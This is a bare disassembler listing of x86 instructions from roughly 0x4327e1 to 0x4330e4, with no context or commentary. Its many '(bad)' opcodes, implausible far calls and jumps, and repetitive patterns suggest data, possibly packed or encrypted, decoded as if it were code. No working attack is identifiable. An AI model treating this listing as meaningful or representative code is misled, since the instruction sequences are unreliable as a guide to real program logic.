  4327e1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4327e7:	xor    al,0x5e
  4327e9:	call   0xe2ea8996
  4327ee:	into   
  4327ef:	bound  esp,QWORD PTR [edx+0x62]
  4327f2:	out    0xa9,eax
  4327f4:	or     eax,0xb851c75
  4327f9:	call   0xa8e8:0x5e343ac9
  432800:	popa   
  432801:	ror    BYTE PTR ds:0x62627ae2,cl
  432807:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43280d:	xor    al,0x5e
  43280f:	call   0x631589bc
  432814:	or     ecx,esi
  432816:	bound  esp,QWORD PTR [edx+0x62]
  432819:	or     eax,0xdb0d2475
  43281e:	dec    eax
  43281f:	push   0xd2626161
  432824:	mov    al,bl
  432826:	mov    esp,0x61f72257
  43282b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43282c:	or     eax,0x13c9c964
  432831:	jne    0x432888
  432833:	pop    ss
  432834:	jne    0x43289f
  432836:	or     eax,0x61216975
  43283b:	pushf  
  43283c:	xchg   edi,eax
  43283d:	mov    ah,0x69
  43283f:	(bad)  
  432840:	jmp    0xb269:0xb4979c55
  432847:	mov    WORD PTR ds:0xa2ff9275,cs
  43284d:	call   0xa2ff:0x86750df3
  432854:	push   0x92750d36
  432859:	jmp    DWORD PTR [edx+0x22576434]
  43285f:	xchg   BYTE PTR [ecx-0x5b],ah
  432862:	or     eax,0xfd64d664
  432867:	popa   
  432868:	popa   
  432869:	popa   
  43286a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43286b:	and    DWORD PTR [ebp+0x8],esi
  43286e:	lods   eax,DWORD PTR ds:[esi]
  43286f:	loop   0x432872
  432871:	imul   esp,DWORD PTR [ecx],0xe2252475
  432877:	add    DWORD PTR [ecx+0xd],ebp
  43287a:	jne    0x4328fa
  43287c:	pop    ss
  43287d:	jne    0x43289b
  43287f:	or     eax,0xdb0d1c75
  432884:	or     al,0x68
  432886:	popa   
  432887:	popa   
  432888:	or     eax,0x170d1ccd
  43288d:	or     al,0x68
  43288f:	popa   
  432890:	popa   
  432891:	or     eax,0x56610d91
  432896:	cdq    
  432897:	xchg   esi,eax
  432898:	pop    ss
  432899:	jne    0x432894
  43289b:	or     eax,0xb850875
  4328a0:	call   0xa8e8:0x5e343ac9
  4328a7:	popa   
  4328a8:	pop    ss
  4328a9:	jne    0x4328ff
  4328ab:	or     eax,0xb850875
  4328b0:	call   0xa8e8:0x5e343ac9
  4328b7:	popa   
  4328b8:	pop    ss
  4328b9:	jne    0x432924
  4328bb:	or     eax,0xa20df975
  4328c0:	rcr    al,cl
  4328c2:	xrelease xchg BYTE PTR [edi],dl
  4328c5:	jne    0x432924
  4328c7:	or     eax,0xa20df975
  4328cc:	stos   BYTE PTR es:[edi],al
  4328cd:	fimul  DWORD PTR ds:0x997ff9cd
  4328d3:	mov    esi,0x750d7de7
  4328d8:	stc    
  4328d9:	or     eax,0x4adaaaa2
  4328de:	pop    eax
  4328df:	or     eax,0x997ff9cd
  4328e4:	mov    esi,0x56f9cd0d
  4328e9:	cdq    
  4328ea:	stos   BYTE PTR es:[edi],al
  4328eb:	pop    ss
  4328ec:	loop   0x4328bc
  4328ee:	bound  esp,QWORD PTR [edx+0x62]
  4328f1:	out    dx,al
  4328f2:	xchg   BYTE PTR ds:0xa20df975,cl
  4328f8:	mov    esi,0x62cee217
  4328fd:	bound  esp,QWORD PTR [edx+0xd]
  432900:	loop   0x4328d0
  432902:	bound  esp,QWORD PTR [edx+0x62]
  432905:	pop    ss
  432906:	jne    0x4328b9
  432908:	or     eax,0xb850875
  43290d:	call   0xa8e8:0x5e343ac9
  432914:	popa   
  432915:	pop    ss
  432916:	jne    0x43292c
  432918:	or     eax,0xb850875
  43291d:	call   0xa8e8:0x5e343ac9
  432924:	popa   
  432925:	pop    ss
  432926:	jne    0x432988
  432928:	or     eax,0xb850875
  43292d:	call   0xa8e8:0x5e343ac9
  432934:	popa   
  432935:	or     eax,0x681792cd
  43293a:	and    DWORD PTR [ebp-0x53],esi
  43293d:	and    eax,0x216901e2
  432942:	jne    0x432999
  432944:	mov    bl,0xe2
  432946:	add    DWORD PTR [ecx+0x21],ebp
  432949:	jne    0x432997
  43294b:	and    esp,edx
  43294d:	add    DWORD PTR [ecx+0x21],ebp
  432950:	jne    0x432972
  432952:	and    dl,ah
  432954:	add    DWORD PTR [ecx+0xd],ebp
  432957:	jne    0x43297d
  432959:	test   DWORD PTR [ebx],ecx
  43295b:	call   0xa8e8:0x5e343ac9
  432962:	popa   
  432963:	or     eax,0xba93b1cd
  432968:	pusha  
  432969:	or     eax,0xb850875
  43296e:	call   0x135d:0xa50d3ac9
  432975:	outs   dx,BYTE PTR ds:[esi]
  432976:	xchg   edx,eax
  432977:	pop    esi
  432978:	call   0x60ea8b25
  43297d:	xchg   ebx,eax
  43297e:	fdiv   st,st(3)
  432980:	mul    DWORD PTR [ecx+0x61]
  432983:	or     eax,0xb850875
  432988:	call   0xa8e8:0x5e343ac9
  43298f:	popa   
  432990:	pop    ss
  432991:	jne    0x4329fc
  432993:	or     eax,0x75568675
  432998:	mov    cl,0x17
  43299a:	jne    0x4329f0
  43299c:	bound  esi,QWORD PTR [edx-0x794d9dac]
  4329a2:	bound  esi,QWORD PTR [edx-0x2a270c07]
  4329a8:	popa   
  4329a9:	popa   
  4329aa:	pop    ss
  4329ab:	jne    0x4329ae
  4329ad:	and    edx,esp
  4329af:	fbld   TBYTE PTR [edx+0x62]
  4329b2:	bound  edx,QWORD PTR [edx+eiz*8]
  4329b5:	add    DWORD PTR [ecx+0xd],ebp
  4329b8:	loop   0x432999
  4329ba:	bound  esp,QWORD PTR [edx+0x62]
  4329bd:	test   DWORD PTR [ebx],ecx
  4329bf:	call   0xa8e8:0x5e343ac9
  4329c6:	popa   
  4329c7:	rcl    BYTE PTR [ebx],cl
  4329c9:	jne    0x4329a6
  4329cb:	shl    bl,cl
  4329cd:	cli    
  4329ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4329cf:	popa   
  4329d0:	popa   
  4329d1:	fsubr  st,st(2)
  4329d3:	add    DWORD PTR [ecx-0x19],esp
  4329d6:	out    0xd,al
  4329d8:	loop   0x4329b9
  4329da:	bound  esp,QWORD PTR [edx+0x62]
  4329dd:	test   DWORD PTR [ebx],ecx
  4329df:	call   0xa8e8:0x5e343ac9
  4329e6:	popa   
  4329e7:	shl    BYTE PTR [edx-0x4e],cl
  4329ea:	add    DWORD PTR [ebx],edx
  4329ec:	jne    0x4329c9
  4329ee:	shl    bl,cl
  4329f0:	jae    0x432a1f
  4329f2:	popa   
  4329f3:	popa   
  4329f4:	or     eax,0xe2175475
  4329f9:	out    0x62,al
  4329fb:	bound  esp,QWORD PTR [edx+0xd]
  4329fe:	jne    0x432986
  432a00:	or     eax,0x6262e613
  432a05:	bound  ebp,QWORD PTR ds:0xe6131760
  432a0b:	bound  esp,QWORD PTR [edx+0x62]
  432a0e:	or     eax,0x6262e6e2
  432a13:	bound  ecx,QWORD PTR ds:0xd10d01cd
  432a19:	xchg   BYTE PTR ds:0xd05601a5,cl
  432a1f:	xchg   edx,eax
  432a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432a21:	pop    ds
  432a22:	call   0x1b837aa
  432a27:	or     eax,0xcd0d86a2
  432a2c:	add    DWORD PTR [esi-0x67],edx
  432a2f:	call   0x6262:0x62e6130d
  432a36:	sub    eax,0xb175561f
  432a3b:	pop    ss
  432a3c:	jne    0x4329ef
  432a3e:	lock (bad) 
  432a40:	bound  esp,QWORD PTR [edx+0x62]
  432a43:	jo     0x4329cb
  432a45:	bound  esi,QWORD PTR [edx-0xc8aecac]
  432a4b:	shl    bl,cl
  432a4d:	push   0x2d
  432a4f:	popa   
  432a50:	popa   
  432a51:	and    edx,esp
  432a53:	jmp    0x432ab7
  432a55:	bound  esp,QWORD PTR [edx-0x53]
  432a58:	loop   0x432a5b
  432a5a:	imul   esp,DWORD PTR [ecx],0x6262e7e2
  432a60:	bound  esp,QWORD PTR ds:0x216901e2
  432a66:	jne    0x432a65
  432a68:	mov    bl,0xe2
  432a6a:	add    DWORD PTR [ecx+0x21],ebp
  432a6d:	jne    0x432a7b
  432a6f:	and    esp,edx
  432a71:	add    DWORD PTR [ecx+0x13],ebp
  432a74:	loop   0x432a61
  432a76:	bound  esp,QWORD PTR [edx+0x62]
  432a79:	pop    ss
  432a7a:	jne    0x432a80
  432a7c:	adc    esp,edx
  432a7e:	out    0x62,eax
  432a80:	bound  esp,QWORD PTR [edx+0x17]
  432a83:	loop   0x432a68
  432a85:	bound  esp,QWORD PTR [edx+0x62]
  432a88:	adc    esi,DWORD PTR [ebp-0x3]
  432a8b:	pop    ss
  432a8c:	jne    0x432a77
  432a8e:	adc    esi,DWORD PTR [ebp+0xc]
  432a91:	pop    ss
  432a92:	jne    0x432a89
  432a94:	or     eax,0xb850875
  432a99:	call   0xa8e8:0x5e343ac9
  432aa0:	popa   
  432aa1:	pop    ss
  432aa2:	jne    0x432ab4
  432aa4:	and    edx,esp
  432aa6:	jp     0x432b0a
  432aa8:	bound  esp,QWORD PTR [edx-0x53]
  432aab:	loop   0x432aae
  432aad:	imul   ebp,esi,0x7ae20dd4
  432ab3:	bound  esp,QWORD PTR [edx+0x62]
  432ab6:	test   DWORD PTR [ebx],ecx
  432ab8:	call   0xd624:0xcd0d3ac9
  432abf:	outs   dx,DWORD PTR ds:[esi]
  432ac0:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432ac6:	call   0xb85:0x61a8e85e
  432acd:	call   0x627a:0xe2173ac9
  432ad4:	bound  esp,QWORD PTR [edx+0xd]
  432ad7:	jne    0x432b42
  432ad9:	or     eax,0x6fd608cd
  432ade:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432ae4:	pop    esi
  432ae5:	call   0x1fea8c92
  432aea:	xchg   ebx,eax
  432aeb:	loop   0x432aa8
  432aed:	pop    edi
  432aee:	popa   
  432aef:	popa   
  432af0:	(bad)  
  432af1:	and    edi,DWORD PTR [edx+0x62]
  432af4:	bound  esp,QWORD PTR [edx-0x4d]
  432af7:	loop   0x432afa
  432af9:	imul   edx,DWORD PTR [ebx+0x615f0a6e],0x24750d61
  432b03:	test   DWORD PTR [ebx],ecx
  432b05:	call   0xa8e8:0x5e343ac9
  432b0c:	popa   
  432b0d:	pop    ss
  432b0e:	jne    0x432b79
  432b10:	or     eax,0x62627ae2
  432b15:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  432b1b:	or     eax,0x6e1310cd
  432b20:	push   0x61a8e85e
  432b25:	pop    ss
  432b26:	jne    0x432b38
  432b28:	or     eax,0xcd0d1075
  432b2d:	and    al,0xd6
  432b2f:	outs   dx,DWORD PTR ds:[esi]
  432b30:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b36:	pop    esi
  432b37:	call   0x1fea8ce4
  432b3c:	mov    dl,0x81
  432b3e:	or     eax,0xb850875
  432b43:	call   0xa8e8:0x5e343ac9
  432b4a:	popa   
  432b4b:	shl    BYTE PTR [eax-0x7a],cl
  432b4e:	adc    esi,DWORD PTR [ebp-0xd]
  432b51:	shl    bl,cl
  432b53:	call   0x475:0xd62623f
  432b5a:	or     eax,0x9a0b8561
  432b5f:	leave  
  432b60:	cmp    dl,BYTE PTR [ebx+0x35346e06]
  432b66:	call   0xcd508d13
  432b6b:	or     dh,dl
  432b6d:	outs   dx,DWORD PTR ds:[esi]
  432b6e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b74:	pop    esi
  432b75:	call   0x1fea8d22
  432b7a:	out    0xe8,eax
  432b7c:	or     eax,0x6262e3e2
  432b81:	bound  ecx,QWORD PTR ds:0x9a0b8561
  432b87:	leave  
  432b88:	cmp    dl,BYTE PTR [ebx+0x35346e06]
  432b8e:	call   0xcd508d3b
  432b93:	or     dh,dl
  432b95:	outs   dx,DWORD PTR ds:[esi]
  432b96:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b9c:	pop    esi
  432b9d:	call   0x1fea8d4a
  432ba2:	out    0xd0,eax
  432ba4:	or     eax,0x610de975
  432ba9:	test   DWORD PTR [ebx],ecx
  432bab:	call   0x346e:0x6933ac9
  432bb2:	xor    eax,0xd61a8e8
  432bb7:	int    0x8
  432bb9:	(bad)  
  432bba:	outs   dx,DWORD PTR ds:[esi]
  432bbb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432bc1:	pop    esi
  432bc2:	call   0x1fea8d6f
  432bc7:	out    0xd5,eax
  432bc9:	or     eax,0x610df575
  432bce:	test   DWORD PTR [ebx],ecx
  432bd0:	call   0x346e:0x6933ac9
  432bd7:	xor    eax,0xd61a8e8
  432bdc:	int    0x8
  432bde:	(bad)  
  432bdf:	outs   dx,DWORD PTR ds:[esi]
  432be0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432be6:	pop    esi
  432be7:	call   0x1fea8d94
  432bec:	mov    dl,0x6b
  432bee:	or     eax,0xb850875
  432bf3:	call   0xa8e8:0x5e343ac9
  432bfa:	popa   
  432bfb:	pop    ss
  432bfc:	jne    0x432c67
  432bfe:	lock adc ch,BYTE PTR [eax+0x61]
  432c02:	popa   
  432c03:	or     eax,0x610d0475
  432c08:	test   DWORD PTR [ebx],ecx
  432c0a:	call   0x346e:0x6933ac9
  432c11:	ret    0xa8e8
  432c14:	popa   
  432c15:	or     eax,0x910de9cd
  432c1a:	(bad)  
  432c1b:	outs   dx,DWORD PTR ds:[esi]
  432c1c:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432c22:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432c28:	or     eax,0x880d04a5
  432c2d:	(bad)  
  432c2e:	or     bx,WORD PTR [edx+0x6933ac9]
  432c35:	jmp    0xa92b61a5
  432c3a:	popa   
  432c3b:	or     eax,0x6262e30b
  432c40:	bound  ecx,QWORD PTR ds:0xb4bd684
  432c46:	call   0x8508:0x6933ac9
  432c4d:	xor    eax,0xaf61a8e8
  432c52:	es xchg edi,eax
  432c54:	dec    esi
  432c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c56:	pop    ds
  432c57:	xchg   ebx,eax
  432c58:	loop   0x432c95
  432c5a:	push   0xe20d6161
  432c5f:	jecxz  0x432cc3
  432c61:	bound  esp,QWORD PTR [edx+0xd]
  432c64:	popa   
  432c65:	test   DWORD PTR [ebx],ecx
  432c67:	call   0x346e:0x6933ac9
  432c6e:	ret    0xa8e8
  432c71:	popa   
  432c72:	or     eax,0x910df5cd
  432c77:	(bad)  
  432c78:	outs   dx,DWORD PTR ds:[esi]
  432c79:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432c7f:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432c85:	or     eax,0x6262e3e4
  432c8a:	bound  ecx,QWORD PTR ds:0xb66d688
  432c90:	call   0x6be9:0x6933ac9
  432c97:	xor    eax,0xd61a8e8
  432c9c:	mov    dl,0xe9
  432c9e:	or     eax,0xb4bd684
  432ca3:	call   0x8508:0x6933ac9
  432caa:	xor    eax,0xaf61a8e8
  432caf:	es xchg edi,eax
  432cb1:	dec    esi
  432cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432cb3:	pop    ds
  432cb4:	xchg   ebx,eax
  432cb5:	loop   0x432c67
  432cb7:	popa   
  432cb8:	popa   
  432cb9:	popa   
  432cba:	or     eax,0x610de975
  432cbf:	test   DWORD PTR [ebx],ecx
  432cc1:	call   0x346e:0x6933ac9
  432cc8:	ret    0xa8e8
  432ccb:	popa   
  432ccc:	or     eax,0x910d04cd
  432cd1:	(bad)  
  432cd2:	outs   dx,DWORD PTR ds:[esi]
  432cd3:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432cd9:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432cdf:	or     eax,0x880de9a5
  432ce4:	(bad)  
  432ce5:	or     bx,WORD PTR [edx+0x6933ac9]
  432cec:	jmp    0xa92b625c
  432cf1:	popa   
  432cf2:	or     eax,0x840df5b2
  432cf7:	(bad)  
  432cf8:	dec    ebx
  432cf9:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432cff:	or     BYTE PTR [ebp+0x61a8e835],al
  432d05:	scas   eax,DWORD PTR es:[edi]
  432d06:	es xchg edi,eax
  432d08:	dec    esi
  432d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d0a:	pop    ds
  432d0b:	mov    dl,0xa4
  432d0d:	or     eax,0x610df575
  432d12:	test   DWORD PTR [ebx],ecx
  432d14:	call   0x346e:0x6933ac9
  432d1b:	ret    0xa8e8
  432d1e:	popa   
  432d1f:	or     eax,0x6262e313
  432d24:	bound  ecx,QWORD PTR ds:0xb6fd691
  432d2a:	call   0x8d10:0x6933ac9
  432d31:	xor    eax,0xd61a8e8
  432d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432d37:	cmc    
  432d38:	or     eax,0xb66d688
  432d3d:	call   0x6be9:0x6933ac9
  432d44:	xor    eax,0xd61a8e8
  432d49:	mov    dl,0x4
  432d4b:	or     eax,0xb4bd684
  432d50:	call   0x8508:0x6933ac9
  432d57:	xor    eax,0xaf61a8e8
  432d5c:	es xchg edi,eax
  432d5e:	dec    esi
  432d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d60:	pop    ds
  432d61:	out    0x88,eax
  432d63:	or     eax,0xb850875
  432d68:	call   0xa8e8:0x5e343ac9
  432d6f:	popa   
  432d70:	pop    ss
  432d71:	jne    0x432ddc
  432d73:	out    dx,al
  432d74:	sti    
  432d75:	jo     0x432d11
  432d77:	adc    esi,DWORD PTR [ebp-0xd]
  432d7a:	shl    bl,cl
  432d7c:	jno    0x432d27
  432d7e:	popa   
  432d7f:	popa   
  432d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d81:	jne    0x432db4
  432d83:	out    0x92,eax
  432d85:	or     eax,0xb850875
  432d8a:	call   0xa8e8:0x5e343ac9
  432d91:	popa   
  432d92:	pop    ss
  432d93:	jne    0x432dfe
  432d95:	lock push 0x5c
  432d98:	bound  esp,QWORD PTR [edx+0xd]
  432d9b:	jne    0x432e06
  432d9d:	or     eax,0x6fd608cd
  432da2:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432da8:	pop    esi
  432da9:	call   0x1fea8f56
  432dae:	mov    dl,0x80
  432db0:	or     eax,0xb852475
  432db5:	call   0x13b1:0xcd0d3ac9
  432dbc:	outs   dx,BYTE PTR ds:[esi]
  432dbd:	push   0x61a8e85e
  432dc2:	pop    ss
  432dc3:	jne    0x432d76
  432dc5:	lock adc BYTE PTR [esi+0x62],bl
  432dc9:	bound  esi,QWORD PTR [eax-0x76]
  432dcc:	bound  esi,QWORD PTR [edx+0x58751354]
  432dd2:	shl    bl,cl
  432dd4:	sbb    DWORD PTR [edx],eax
  432dd6:	popa   
  432dd7:	popa   
  432dd8:	or     eax,0xb850875
  432ddd:	call   0xa8e8:0x5e343ac9
  432de4:	popa   
  432de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432de6:	jne    0x432df8
  432de8:	out    0x81,eax
  432dea:	or     eax,0xb850875
  432def:	call   0xa8e8:0x5e343ac9
  432df6:	popa   
  432df7:	shl    BYTE PTR [eax-0x76],cl
  432dfa:	adc    esi,DWORD PTR [ebp+0x58]
  432dfd:	shl    bl,cl
  432dff:	mov    dh,0x42
  432e01:	bound  esp,QWORD PTR [edx+0xd]
  432e04:	jne    0x432e5a
  432e06:	fcomp  DWORD PTR [edx+ecx*4]
  432e09:	pop    ss
  432e0a:	jne    0x432e20
  432e0c:	bound  esi,QWORD PTR [edx+0x14b26218]
  432e12:	or     eax,0x75569a75
  432e17:	dec    eax
  432e18:	shl    bl,cl
  432e1a:	rol    DWORD PTR [edx],1
  432e1c:	popa   
  432e1d:	popa   
  432e1e:	or     eax,0xb850875
  432e23:	call   0xa8e8:0x5e343ac9
  432e2a:	popa   
  432e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e2c:	jne    0x432e3e
  432e2e:	out    0x89,eax
  432e30:	jo     0x432e93
  432e32:	bound  esi,QWORD PTR [edx-0x658af2e8]
  432e38:	push   esi
  432e39:	jne    0x432e83
  432e3b:	shl    bl,cl
  432e3d:	jl     0x432e81
  432e3f:	bound  esp,QWORD PTR [edx+0xd]
  432e42:	jne    0x432dd6
  432e44:	pop    ss
  432e45:	loop   0x432e87
  432e47:	bound  esp,QWORD PTR [edx+0x62]
  432e4a:	or     eax,0x626240e2
  432e4f:	bound  ecx,QWORD PTR ds:0x9a5618cd
  432e55:	or     eax,0x626240e2
  432e5a:	bound  edx,QWORD PTR [edi]
  432e5c:	call   0x1875:0x56b1750d
  432e63:	pop    ss
  432e64:	jne    0x432e17
  432e66:	lock out dx,al
  432e68:	bound  esp,QWORD PTR [bp+si+0xd]
  432e6c:	jne    0x432e08
  432e6e:	mov    esp,0x61922257
  432e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e74:	or     eax,0x13c9c964
  432e79:	jne    0x432ed0
  432e7b:	pop    ss
  432e7c:	jne    0x432ee7
  432e7e:	or     eax,0x61216975
  432e83:	mov    eax,ds:0xd63a3b8c
  432e88:	jmp    0xb23a:0x3b8ca155
  432e8f:	imul   ecx,DWORD PTR ds:0xa2ff9275,0xfffffff7
  432e96:	sbb    BYTE PTR ds:0xa2ff8675,cl
  432e9c:	push   esi
  432e9d:	dec    ecx
  432e9e:	or     eax,0xa2ff8675
  432ea3:	neg    DWORD PTR [eax]
  432ea5:	or     eax,0x61ff9275
  432eaa:	adc    al,0x57
  432eac:	and    al,BYTE PTR [esi+0x640da561]
  432eb2:	(bad)  
  432eb3:	add    DWORD PTR fs:[ecx+0x61],esp
  432eb7:	popa   
  432eb8:	or     eax,0xb857e75
  432ebd:	call   0xa8e8:0x5e343ac9
  432ec4:	popa   
  432ec5:	pop    ss
  432ec6:	jne    0x432f31
  432ec8:	adc    al,0x7a
  432eca:	int3   
  432ecb:	popa   
  432ecc:	popa   
  432ecd:	xchg   esp,eax
  432ece:	pop    ss
  432ecf:	jne    0x432f29
  432ed1:	adc    al,0x34
  432ed3:	int3   
  432ed4:	popa   
  432ed5:	popa   
  432ed6:	xchg   esp,eax
  432ed7:	pop    ss
  432ed8:	jne    0x432f20
  432eda:	adc    al,0xe3
  432edc:	int3   
  432edd:	popa   
  432ede:	popa   
  432edf:	xchg   esp,eax
  432ee0:	pop    ss
  432ee1:	jne    0x432f0b
  432ee3:	adc    al,0xaa
  432ee5:	int3   
  432ee6:	popa   
  432ee7:	popa   
  432ee8:	xchg   esp,eax
  432ee9:	pop    ss
  432eea:	jne    0x432f12
  432eec:	adc    al,0xc4
  432eee:	int3   
  432eef:	popa   
  432ef0:	popa   
  432ef1:	xchg   esp,eax
  432ef2:	pop    ss
  432ef3:	jne    0x432f45
  432ef5:	adc    al,0xa3
  432ef7:	int3   
  432ef8:	popa   
  432ef9:	popa   
  432efa:	xchg   esp,eax
  432efb:	pop    ss
  432efc:	jne    0x432f3c
  432efe:	adc    al,0xe8
  432f00:	int3   
  432f01:	popa   
  432f02:	popa   
  432f03:	xchg   esp,eax
  432f04:	pop    ss
  432f05:	jne    0x432f43
  432f07:	adc    al,0x96
  432f09:	int3   
  432f0a:	popa   
  432f0b:	popa   
  432f0c:	xchg   esp,eax
  432f0d:	pop    ss
  432f0e:	jne    0x432f52
  432f10:	adc    al,0xe6
  432f12:	int3   
  432f13:	popa   
  432f14:	popa   
  432f15:	xchg   esp,eax
  432f16:	pop    ss
  432f17:	jne    0x432f61
  432f19:	adc    al,0x9d
  432f1b:	int3   
  432f1c:	popa   
  432f1d:	popa   
  432f1e:	xchg   esp,eax
  432f1f:	pop    ss
  432f20:	jne    0x432f58
  432f22:	adc    al,0x34
  432f24:	int3   
  432f25:	popa   
  432f26:	popa   
  432f27:	xchg   esp,eax
  432f28:	pop    ss
  432f29:	jne    0x432f43
  432f2b:	adc    al,0xa8
  432f2d:	int3   
  432f2e:	popa   
  432f2f:	popa   
  432f30:	xchg   esp,eax
  432f31:	pop    ss
  432f32:	jne    0x432f4a
  432f34:	adc    al,0xcc
  432f36:	inc    ebp
  432f37:	popa   
  432f38:	popa   
  432f39:	xchg   esp,eax
  432f3a:	pop    ss
  432f3b:	jne    0x432f30
  432f3d:	adc    al,0xd3
  432f3f:	es popa 
  432f41:	popa   
  432f42:	xchg   esp,eax
  432f43:	pop    ss
  432f44:	jne    0x432f37
  432f46:	adc    al,0xdc
  432f48:	dec    eax
  432f49:	popa   
  432f4a:	popa   
  432f4b:	xchg   esp,eax
  432f4c:	pop    ss
  432f4d:	jne    0x432fb3
  432f4f:	adc    al,0xdf
  432f51:	xor    DWORD PTR [ecx+0x61],esp
  432f54:	xchg   esp,eax
  432f55:	pop    ss
  432f56:	jne    0x432f45
  432f58:	adc    al,0xa3
  432f5a:	int3   
  432f5b:	popa   
  432f5c:	popa   
  432f5d:	xchg   esp,eax
  432f5e:	pop    ss
  432f5f:	jne    0x432f92
  432f61:	or     eax,0xb858a75
  432f66:	call   0xd68a:0xcd0d3ac9
  432f6d:	outs   dx,DWORD PTR ds:[esi]
  432f6e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f74:	call   0xcd0d:0x61ce1b4b
  432f7b:	mov    dl,dh
  432f7d:	outs   dx,DWORD PTR ds:[esi]
  432f7e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f84:	call   0xcd0d:0x61a8e85e
  432f8b:	mov    dl,dh
  432f8d:	outs   dx,DWORD PTR ds:[esi]
  432f8e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f94:	call   0x7517:0x61a8e85e
  432f9b:	fisttp DWORD PTR ds:0xb857e75
  432fa1:	call   0xa8e8:0x5e343ac9
  432fa8:	popa   
  432fa9:	or     eax,0x6fd67ecd
  432fae:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  432fb4:	adc    ebp,ebx
  432fb6:	dec    ebp
  432fb7:	push   edi
  432fb8:	popa   
  432fb9:	or     eax,0x610dfb75
  432fbe:	or     eax,0x6fd68acd
  432fc3:	or     ebx,DWORD PTR [edx-0x5df2c537]
  432fc9:	rcl    BYTE PTR [edi],cl
  432fcb:	outs   dx,BYTE PTR ds:[esi]
  432fcc:	adc    ebp,ebx
  432fce:	dec    ebp
  432fcf:	push   edi
  432fd0:	popa   
  432fd1:	or     eax,0xb858e75
  432fd6:	call   0xa8e8:0x5e343ac9
  432fdd:	popa   
  432fde:	or     eax,0x6fd68acd
  432fe3:	or     ebx,DWORD PTR [edx-0x5af2c537]
  432fe9:	mov    dl,dh
  432feb:	or     bx,WORD PTR [edx+0x10133ac9]
  432ff2:	mov    DWORD PTR [ebx+0x1b],ecx
  432ff5:	into   
  432ff6:	popa   
  432ff7:	pop    ss
  432ff8:	sub    al,0x13
  432ffa:	outs   dx,BYTE PTR ds:[esi]
  432ffb:	or     eax,0xb853875
  433000:	call   0xa8e8:0x5e343ac9
  433007:	popa   
  433008:	or     eax,0x6fd68acd
  43300d:	or     ebx,DWORD PTR [edx-0x5af2c537]
  433013:	mov    dl,dh
  433015:	or     bx,WORD PTR [edx+0x10133ac9]
  43301c:	mov    DWORD PTR [ebx+0x1b],ecx
  43301f:	into   
  433020:	popa   
  433021:	or     eax,0x66d68aa5
  433026:	or     ebx,DWORD PTR [edx+0x10133ac9]
  43302c:	mov    DWORD PTR [esi-0x18],ebx
  43302f:	test   al,0x61
  433031:	pop    ss
  433032:	sub    al,0x13
  433034:	outs   dx,BYTE PTR ds:[esi]
  433035:	adc    esi,DWORD PTR [ebp-0x25]
  433038:	ror    BYTE PTR ds:0xb858a75,cl
  43303e:	call   0xa8e8:0x5e343ac9
  433045:	popa   
  433046:	ror    BYTE PTR ds:0xbb349e75,cl
  43304c:	popa   
  43304d:	popa   
  43304e:	popa   
  43304f:	ror    BYTE PTR ds:0xdb0d9e75,cl
  433055:	cmc    
  433056:	push   0x72626161
  43305b:	bound  esp,QWORD PTR [ebp-0x2532f28e]
  433061:	pop    ss
  433062:	push   0xda2750d
  433067:	int    0xaa
  433069:	or     eax,0xd9a1791
  43306e:	jne    0x433006
  433070:	or     eax,0x910ddacd
  433075:	pop    ss
  433076:	call   0x9a0b:0x858a750d
  43307d:	leave  
  43307e:	cmp    cl,BYTE PTR ds:0x6fd68acd
  433084:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43308a:	call   0xcd0d:0x61ce1b4b
  433091:	mov    dl,dh
  433093:	outs   dx,DWORD PTR ds:[esi]
  433094:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43309a:	call   0xcd0d:0x61a8e85e
  4330a1:	mov    dl,dh
  4330a3:	outs   dx,DWORD PTR ds:[esi]
  4330a4:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4330aa:	call   0x7517:0x61a8e85e
  4330b1:	fisttp DWORD PTR ds:0x610dda75
  4330b7:	or     eax,0x6fd67ecd
  4330bc:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  4330c2:	adc    ebp,ebx
  4330c4:	dec    ebp
  4330c5:	push   edi
  4330c6:	popa   
  4330c7:	or     eax,0x610dfb75
  4330cc:	or     eax,0x6fd68acd
  4330d1:	or     ebx,DWORD PTR [edx-0x5df2c537]
  4330d7:	rcl    BYTE PTR [edi],cl
  4330d9:	outs   dx,BYTE PTR ds:[esi]
  4330da:	adc    ebp,ebx
  4330dc:	dec    ebp
  4330dd:	push   edi
  4330de:	popa   
  4330df:	or     eax,0xb85a675
  4330e4:	call   0xa8e8:0x5e343ac9
